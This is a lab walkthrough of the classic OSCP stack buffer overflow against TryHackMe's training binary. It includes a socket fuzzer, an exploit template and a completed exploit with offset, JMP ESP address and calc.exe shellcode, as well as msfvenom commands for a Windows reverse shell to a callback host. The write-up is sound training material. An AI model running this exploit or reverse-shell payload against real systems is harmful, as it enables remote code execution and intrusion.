---
description: >-
  Walkthrough of OSCP Buffer Overflow. OSCP 2023 has removed Buffer Overflows,
  but this guide will remain here.
---

# OSCP BOF (OUTDATED)

For this section I will be using the buffer overflow room from TryHackMe. Good room for practicing the OSCP BOF.&#x20;

{% embed url="https://tryhackme.com/room/bufferoverflowprep" %}

## Pre-Exploit

Before starting, I have some scripts that would help the exploit process a lot. One for fuzzing and finding when the program crashes, and the next for the actual exploit itself.

{% code title="fuzzer.py" overflow="wrap" %}
```python
#!/usr/bin/python
import time, struct, sys
import socket as so


# Create an array of buffers, from 1 to 1000 elements, with increments of 200 bytes each.
buff=["A"]
# max number of buffers in the array
max_buffer = 1000
# initial value of the counter
counter=100
# increment value
increment=200

while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
    try:
        server = sys.argv[1]
        port = sys.argv[2]
    except IndexError:
        print "[+] Usage %s host + port " % sys.argv[0]
        sys.exit()

    print "Fuzzing with %s bytes" % len(string)
    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    try:
        s.connect((server, port))
        print s.recv(1024)
        s.send( string+'\r\n')
        s.send('exit\r\n')
        print s.recv(1024)
    except:
        print "[!] connection refused, check debugger"
        sys(exit)
```
{% endcode %}

<pre class="language-python" data-title="exploit.py" data-overflow="wrap"><code class="lang-python">#!/usr/bin/python2

import socket

ip = ""
port = 
timeout = 5

prefix = "OVERFLOW2 " # this prefix is required for the TryHackMe Bof room, not required in others.
#pattern = ""
#badchars = (
 # "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
 # "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
 # "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
 # "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
<strong> # "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
</strong> # "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
 # "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
 # "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
 # "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
 # "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
 # "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
 # "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
 # "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
 # "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
 # "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
 # "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
# )
# final badchars are 

# msfvenom -p windows/shell_reverse_tcp LHOST=10.4.67.186 LPORT=4444 EXITFUNC=thread -b "" -f c -v payload 
# msfvenom -p windows/exec CMD=calc.exe -b "" -f c -v payload
print ("\nSending evil buffer...")
size = 
offset = "A"*size #filler
eip = "" #rtn
nop = "\x90" * 16
payload =("")  #shellcode here

#buffer = prefix + pattern  #for fuzzing offset
#buffer = prefix + offset + badchars #for fuzzing bad chars
# buffer = prefix + offset + eip + nop + payload # for final payload

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.send(bytes(buffer + "\r\n", "latin-1"))
s.close()
print ("\nDone!")

</code></pre>

`exploit.py` has loads of empty spaces for the user to fill, such as the pattern generated by MSF, IP and Port, as well as the bad characters (which I normally copy and paste and edit as I go along).

The vulnerable binary would open a port and listen for connections, of which we can send data through the port opened. Thus, both the scripts above use `sockets` to connect and send data.

Lastly, you would need to have **Immunity Debugger on a Windows VM** for this before starting. The malicious binary would be opened and debugged there. Make sure that `mona.py` is also present within the working directory of the debugger.

{% embed url="https://www.immunityinc.com/products/debugger/" %}

We would first need to set up mona's working directory (where all the files it generates goes) as such:

<figure><img src="../.gitbook/assets/image (15) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>

You can download `mona.py` from here:

{% embed url="https://github.com/corelan/mona" %}

## Fuzzing

First we need to fuzz the application to test at what character it will crash at. For OVERFLOW 2 of this room, it was after 700 bytes of data were sent.

<figure><img src="../.gitbook/assets/image (2) (1) (3) (2).png" alt=""><figcaption></figcaption></figure>

If we take a look at Immunity Debugger, the register window would look like this:

<figure><img src="../.gitbook/assets/image (7) (3) (1) (2).png" alt=""><figcaption></figcaption></figure>

The EIP is filled with \x41 (which translates back to "A"). So the program would crash and we need to reload this in Immunity Debugger a lot.

## Finding Offset

When finding the offset, we need to use `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb`, which is a script that would create a string of text for us to send again.&#x20;

<figure><img src="../.gitbook/assets/image (88) (1) (2).png" alt=""><figcaption></figcaption></figure>

Once generated, replace the `pattern` parameter in `exploit.py`. Then, run the script and resend the buffer. Since the goal is to control the EIP to go wherever we want, we would need to take note of the value of the EIP when we send the pattern.

<figure><img src="../.gitbook/assets/image (24) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Then, we can use `pattern_offset.rb`, which is located in the same folder to find the exact offset that we need.

<figure><img src="../.gitbook/assets/image (94) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

## Finding Bad Characters

Now, we know the exact offset is 634, and we need to fuzz for bad characters.

> Bad characters are specific characters in hex that would cause corruption of data within an application. This corruption must be avoided to allow for whatever shellcode we inject to work properly.

We can use `mona.py` from Immunity Debugger to first generate a `bytearray.bin` file which would contain all the bad characters. In console of Immunity, use `!mona bytearray -b "\x00"` to generate this file. The `-b` flag is used to indicate what bad characters are present, and we typically always include the null byte `\x00` as it tends to corrupt things as well.&#x20;

Afterwards, fill in the exploit with the offset number and send the bad characters along with it. The program would crash, and we need to view the **values on the stack**.&#x20;

<figure><img src="../.gitbook/assets/image (10) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Notice that the characters for 'A' ends, and then some special characters begin from there. In this case, the address is at `0x00e2fa18`. This is the address we need to start comparing from, because that's where the **bad characters that we sent in begins**.&#x20;

We can use `mona.py` to do so again, through `!mona compare -f C:\path\to\bytearray.bin -a 00e2fa18`. This would compare the characters from the bytearray we generated to the address of the stack at that value.&#x20;

<figure><img src="../.gitbook/assets/image (2) (6) (2).png" alt=""><figcaption></figcaption></figure>

So the bad characters are highlighted in this case. Before removing all of them, **take note that one bad character can sometimes cause the next byte to be corrupted**. For example, \x23 is a bad character, and causes \x24 to also become corrupted, but \x24 is not a bad character we need to avoid.

So the bad characters so far are `\x00\x23\x3c\x83\xba`. Update the bad character strings from our exploit script and generate a new bytearray in mona using `!mona bytearray -b "\x00\x23\x3c\x83\xba"`. Then, run the script and let the program crash, while also **recomparing the address to the bytearray generated**.&#x20;

Take note that the address **can change, so look at the values of the stack to know where to start comparing from**. If we have successfully removed all bad characters, the output from the comparison would look like this:

<figure><img src="../.gitbook/assets/image (43) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

If not, there would still be bad characters present, and we need to **repeat the process until the status is unmodified.**

## JMP ESP

Now, we need to find a `JMP ESP` instruction. The reason we need this is because once we control the EIP, we can tell it to go anywhere. Being in control of a `JMP ESP` instruction would allow us to 'jump' to the top of the stack (since ESP points there) and inject our shellcode there. This would allow us to **redirect our execution to the top of the stack reliably**.&#x20;

We can do this with Mona, and this can be done whether the binary is running or crashed. We have to run `!mona jmp -r esp -b "\x00\x23\3c\x83\xba"` to find this instruction.&#x20;

<figure><img src="../.gitbook/assets/image (8) (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

There are quite a few to choose from, and I chose `\x62\x50\x12\x05`, which would work fine with our payload. When putting this address in, **take note to reverse it as we are working with a 32-bit machine**. This would mean that it is a **little-endian** arrangement. So in our exploit, we need to write the new value of the EIP as `\x05\x12\x50\x62`.&#x20;

## Generating Shellcode

We can proceed with generating shellcode. This can be done through `msfvenom` and we can either gain a reverse shell or just spawn the calculator for a PoC. The `-b` flag would be where we put our bad characters, and `msfvenom` would generate the shellcode without these characters.&#x20;

For this binary, I wanted to spawn the calculator. The command to generate this is:

{% code overflow="wrap" %}
```bash
msfvenom -p windows/exec CMD=calc.exe -b "x00\x23\x3c\x83\xba" -f c -v payload # for calculator

msfvenom -p windows/shell_reverse_tcp LHOST=10.4.67.186 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c -v payload # for reverse shell
```
{% endcode %}

Then, we can load the shellcode into our exploit. Then, make sure to include some NOP instructions to allow for some space for our shellcode to execute. I have included 16 bytes of NOP instructions within the `exploit.py` script.

The final script should look like this:

```python
#!/usr/bin/python2

import socket

ip = "192.168.175.129"
port = 1337
timeout = 5

prefix = "OVERFLOW2 "
#pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

#badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# final badchars are \x00\x23\x3c\x83\xba
# msfvenom -p windows/exec CMD=calc.exe -b "x00\x23\x3c\x83\xba" -f c -v payload
print ("\nSending evil buffer...")
size = 634
offset = "A"*size #filler
eip = "\x05\x12\x50\x62" #rtn
nop = "\x90" * 16
payload =("\xfc\xbb\x8c\xd6\xf9\xd7\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x70\x3e\x7b\xd7\x88"
"\xbf\x1c\x51\x6d\x8e\x1c\x05\xe6\xa1\xac\x4d\xaa\x4d\x46\x03"
"\x5e\xc5\x2a\x8c\x51\x6e\x80\xea\x5c\x6f\xb9\xcf\xff\xf3\xc0"
"\x03\xdf\xca\x0a\x56\x1e\x0a\x76\x9b\x72\xc3\xfc\x0e\x62\x60"
"\x48\x93\x09\x3a\x5c\x93\xee\x8b\x5f\xb2\xa1\x80\x39\x14\x40"
"\x44\x32\x1d\x5a\x89\x7f\xd7\xd1\x79\x0b\xe6\x33\xb0\xf4\x45"
"\x7a\x7c\x07\x97\xbb\xbb\xf8\xe2\xb5\xbf\x85\xf4\x02\xbd\x51"
"\x70\x90\x65\x11\x22\x7c\x97\xf6\xb5\xf7\x9b\xb3\xb2\x5f\xb8"
"\x42\x16\xd4\xc4\xcf\x99\x3a\x4d\x8b\xbd\x9e\x15\x4f\xdf\x87"
"\xf3\x3e\xe0\xd7\x5b\x9e\x44\x9c\x76\xcb\xf4\xff\x1c\x0a\x8a"
"\x7a\x52\x0c\x94\x84\xc3\x65\xa5\x0f\x8c\xf2\x3a\xda\xe8\x0d"
"\x71\x46\x58\x86\xdc\x13\xd8\xcb\xde\xce\x1f\xf2\x5c\xfa\xdf"
"\x01\x7c\x8f\xda\x4e\x3a\x7c\x97\xdf\xaf\x82\x04\xdf\xe5\xe1"
"\xcb\x73\x65\xcb\x6e\xf4\x0c\x13\x71\x04\xcf\x13\x71\x04\xcf")

#buffer = prefix + pattern  #for fuzzing offset
#buffer = prefix + offset + badchars #for fuzzing bad chars
buffer = prefix + offset + eip + nop + payload 

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.send(bytes(buffer + "\r\n", "latin-1"))
s.close()
print ("\nDone!")
```

Once we run this exploit on the binary again, the program crashes, and executes our shellcode, causing the calculator to pop out.&#x20;

This is how the BOF machines for OSCP (which are basically a giveaway 25 points) work.&#x20;

## Summary

In summary, we need to do the following:

1. Fuzz and find offset
2. Find bad characters through generating bytearrays and comparing with the stack contents
3. Find a `JMP ESP` instruction
4. Generate shellcode that accounts for bad characters
5. Profit
